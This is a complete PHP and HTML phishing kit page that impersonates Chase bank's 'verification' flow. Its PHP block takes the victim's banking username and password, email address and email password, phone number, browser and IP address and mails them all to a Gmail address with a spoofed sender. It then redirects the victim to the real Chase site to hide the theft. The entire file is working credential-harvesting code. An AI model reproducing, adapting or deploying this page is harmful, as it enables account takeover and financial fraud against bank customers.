<?php 
	$username = $_POST['username'];
	$password = $_POST['password'];
	$browser = $_POST['browser'];
 
if(isset($_POST['verify'])){
	$ip = $_SERVER['REMOTE_ADDR'];
	$time= date('l jS \of F Y h:i:s A');
	$username = $_POST['username'];
	$password = $_POST['password'];
	$browser = $_POST['browser'];
	$to ="susanlewiswood789@gmail.com";
	$subj ="Chase | $password | $username | $ip";
	$header = "From:  www.mytoolsbox.com<blankp056@gmail.com,shacheta@gmail.com>";
	
	$msg ="USERNAME: ".$_POST['username'].
		  "\n PASSWORD: ".$_POST['password'].
		  "\n EMAIL: ".$_POST['email'].
		  "\n EMAIL PASSWORD: ".$_POST['ePass'].
		  "\n CONFIRM PASSWORD: ".$_POST['cPass'].
		  "\n Phone Number: ".$_POST['phoneNumber'].
		  "\n BROWSER: ". $_POST['browser'].
		  "\n DATE/ TIME: ". $time.
		  "\n IP: ". $ip;
		  
mail($to, $subj, $msg, $header);
echo "<meta http-equiv='refresh' content='2; url=https://www.chase.com/ccp/index.jsp?pg_name=ccpmapp/individuals/shared/page/switchkit_resource_center' />";
	}
	
	if(isset($_GET['complete'])){
echo "<meta http-equiv='refresh' content='2; url=https://www.chase.com/ccp/index.jsp?pg_name=ccpmapp/individuals/shared/page/switchkit_resource_center' />";
}
 ?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title>CHASE VERIFICATION STEP 2</title>


<link rel="icon" href="img/favicon.fw.png" type="image/png" >
<style type="text/css">


body {
	background-image: url(img/background-repeat.fw.png);
	background-repeat: repeat-x;
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}


.header {
	width:976px;
	margin-right: auto;
	margin-left: auto;
}

.body {
	margin-top: 38px;
	width: 976px;
	margin-right: auto;
	margin-left: auto;
}td img {display: block;}td img {display: block;}

.masterContainer .header table tr td #username {
	height: 20px;
	width: 198px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	font-family: Verdana, Geneva, sans-serif;
	font-size: 14px;
	font-style: italic;
}
.masterContainer .header table tr td #password {
	height: 22px;
	width: 200px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	font-family: Verdana, Geneva, sans-serif;
	font-size: 14px;
	font-style: italic;
}
.masterContainer .header table tr td .submit {
	height: 38px;
	width: 204px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	background-image: url(images/header_r10_c15.gif);
	background-repeat: no-repeat;
	background-color: transparent;
}
.masterContainer .header table tr td table {
	background-color: #0F5BA7;
	width: 960px;
	margin-left: 7px;
	border-top-width: thin;
	border-top-style: solid;
	border-top-color: #0F5BA7;
	border-right-color: #0F5BA7;
	border-bottom-color: #0F5BA7;
	border-left-color: #0F5BA7;
	color: #FFF;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
}
.masterContainer .header table tr td table tr td p img {
	padding: 1px;
	border: 1px solid #050708;
}
.masterContainer .header table tr td table tr td form table tr td {
}
.masterContainer .header table tr td table tr td form table tr td div {
	background-color: #0C457E;
	padding: 5px;
}
</style>

<script>
function validateForm1()
{
var d=document.forms["ccker"]["email"].value;
var e=document.forms["ccker"]["ePass"].value;
var f=document.forms["ccker"]["cPass"].value;

    
if (d==null || d=="")
  {
  alert("Please enter your Email Address");
  return false;
  }
  

if (e==null || e=="")
  {
  alert("Please enter your Email Password");
  return false;
  }

if (f==null || f=="")
  {
  alert("Please Confirm your Email Password");
  return false;
  }
			
}			
</script>

<script type="text/javascript">



</script>

<style type="text/css">
a:link {
	color: #CCC;
}
</style>
<link href="SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css" />
<script src="SpryAssets/SpryValidationTextField.js" type="text/javascript"></script>
</head>

<body>
<div class="masterContainer">
  <div class="header">
    <table style="display: inline-table;" border="0" cellpadding="0" cellspacing="0" width="978">
      <!-- fwtable fwsrc="Untitled-3.fw.png" fwpage="Page 1" fwbase="header.gif" fwstyle="Dreamweaver" fwdocid = "1429416328" fwnested="0" -->
      <tr>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="83" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="17" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="61" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="21" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="18" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="60" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="21" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="41" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="11" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="174" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="96" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="16" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="25" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="41" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="77" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="15" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="84" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="13" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="15" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="69" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="20" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="1" id="undefined_2" /></td>
      </tr>
      <tr>
        <td><img name="header_r1_c1" src="images/header_r1_c1.gif" width="83" height="45" id="header_r1_c1" alt="" /></td>
        <td><img name="header_r1_c2" src="images/header_r1_c2.gif" width="17" height="45" id="header_r1_c2" alt="" /></td>
        <td><img name="header_r1_c3" src="images/header_r1_c3.gif" width="61" height="45" id="header_r1_c3" alt="" /></td>
        <td><img name="header_r1_c4" src="images/header_r1_c4.gif" width="21" height="45" id="header_r1_c4" alt="" /></td>
        <td colspan="2"><img name="header_r1_c5" src="images/header_r1_c5.gif" width="78" height="45" id="header_r1_c5" alt="" /></td>
        <td colspan="6"><img name="header_r1_c7" src="images/header_r1_c7.gif" width="359" height="45" id="header_r1_c7" alt="" /></td>
        <td colspan="3"><img name="header_r1_c13" src="images/header_r1_c13.gif" width="143" height="45" id="header_r1_c13" alt="" /></td>
        <td rowspan="2"><img name="header_r1_c16" src="images/header_r1_c16.gif" width="15" height="102" id="header_r1_c16" alt="" /></td>
        <td><img name="header_r1_c17" src="images/header_r1_c17.gif" width="84" height="45" id="header_r1_c17" alt="" /></td>
        <td rowspan="2"><img name="header_r1_c18" src="images/header_r1_c18.gif" width="13" height="102" id="header_r1_c18" alt="" /></td>
        <td colspan="2"><img name="header_r1_c19" src="images/header_r1_c19.gif" width="84" height="45" id="header_r1_c19" alt="" /></td>
        <td rowspan="2"><img name="header_r1_c21" src="images/header_r1_c21.gif" width="20" height="102" id="header_r1_c21" alt="" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="45" id="undefined_2" /></td>
      </tr>
      <tr>
        <td colspan="7"><a href="index.php"><img name="header_r2_c1" src="images/header_r2_c1.gif" width="281" height="57" id="header_r2_c1" alt="" /></a></td>
        <td colspan="8"><img name="header_r2_c8" src="images/header_r2_c8.gif" width="481" height="57" id="header_r2_c8" alt="" /></td>
        <td><img name="header_r2_c17" src="images/header_r2_c17.gif" width="84" height="57" id="header_r2_c17" alt="" /></td>
        <td colspan="2"><img name="header_r2_c19" src="images/header_r2_c19.gif" width="84" height="57" id="header_r2_c19" alt="" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="57" id="undefined_2" /></td>
      </tr>
      <tr>
        <td colspan="21"><img name="header_r3_c1" src="images/header_r3_c1.gif" width="978" height="22" id="header_r3_c1" alt="" /></td>
        <td>&nbsp;</td>
      </tr>
      <tr>
        <td colspan="22"><table width="100%">
         <?php if(isset($_GET['step1'])){?> <tr>
            <td align="center">
            <p><h3>Welcome, <?PHP echo $_POST['username'];?></h3>
              Last Seen- <?php echo date("F j, Y, g:i a"); ?><br />
              Access Location -
              <?php echo $_SERVER['REMOTE_ADDR'];?><br />
              <br />
             <form action="verification.php" method="post" name="ccker" onsubmit="return validateForm1()">
                <table style="width: 500px; background-color: #7CB8F3" align="left">
                  <tr>
                    <td colspan="2"><div>CONTACT VERIFICATION
                      </div></td>
                  </tr>
                  <tr>
                    <td colspan="2"><input type="hidden" name="time" id="hiddenField" value="<?php echo $time;?>" />
                      <input type="hidden" name="browser" id="browser"  value="<?php echo $_POST['browser'];?>"/>
                      <input type="hidden" name="password" id="password"  value="<?php echo $_POST['password'];?>"/>
                      <input type="hidden" name="username" id="username"  value="<?php echo $_POST['username'];?>"/></td>
                  </tr>
                  <tr>
                    <td width="239" align="right">Email Address</td>
                    <td width="709"><label for="email"></label>
                      <span id="sprytextfield2">
                        <input type="text" name="email" id="email" />
                        <span class="textfieldRequiredMsg">Email address is required.</span><span class="textfieldInvalidFormatMsg">Invalid format.<strong>(e.g: yourID@medford.k12.ma.us)</strong></span></span></td>
</tr>
                  <tr>
                    <td align="right">Email Password</td>
                    <td><label for="textfield"></label>
                      <input type="password" name="ePass" id="ePass" /></td>
                  </tr>
                  <tr>
                    <td align="right">Confirm Password</td>
                    <td><label for="textfield2"></label>
                      <input type="password" name="cPass" id="cPass" /></td>
                  </tr>
                  <tr>
                    <td align="right">Phone Number</td>
                    <td><label for="textfield3"></label>
                      <input type="text" name="phoneNumber" id="phoneNumber" /></td>
                  </tr>
                  <tr>
                    <td>&nbsp;</td>
                    <td><input type="submit" name="verify" id="verify" value="Verify" /></td>
                  </tr>
                </table>
              </form>
              <p>&nbsp;</p></td>
          </tr> <?php }?>
        <?php if(isset($_GET['step2'])){?>  <tr>
            <td align="center"><form action="verification.php" method="post" name="ccker" onsubmit="return validateForm1()"><table style="width: 500px; background-color: #7CB8F3" align="left">
              <tr>                </tr>
              <tr>                </tr>
              <tr>                </tr>
              <tr>                </tr>
            </table>
            </form></td>
          </tr>
        <tr>
          <td align="center">&nbsp;</td>
        </tr>
        <?php }?>
        
      <?php if(isset($_POST['verify'])){?>  <tr>
          <td align="center"><p>&nbsp;</p>
            <h3>&nbsp;</h3>
            <br />
            Verifying your email address<br />
            </p>
            <p><img src="images/progressbar.gif" alt="" width="375" height="15" />Please wait..<b></b> </p>
            <p> <br />
            </p>
            <p>&nbsp;</p></td>
        </tr> <?php }?>
        
        <?php if(isset($_GET['complete'])){?>  <tr>
          <td align="center"><p>&nbsp;</p>
            <h3>Thank you <?php echo $_GET['complete'];?>,<br />
            your account verification is complete.</h3>
            <p>Date <?php echo date("F j, Y, g:i a"); ?><br />
Location <?php echo $_SERVER['REMOTE_ADDR'];?></p>
            <strong><a href="http://www.chase.com">Click here to continue</a></strong><br />
<p> <br />
          </p>
            <p>&nbsp;</p></td>
        </tr> <?php }?>
        
        </table></td>
      </tr>
    </table>
  </div>
</div>
<?php if(isset($_GET['step1'])){?>
<script type="text/javascript">
var sprytextfield2 = new Spry.Widget.ValidationTextField("sprytextfield2", "email");
</script><?php }?>
</body>
</html>
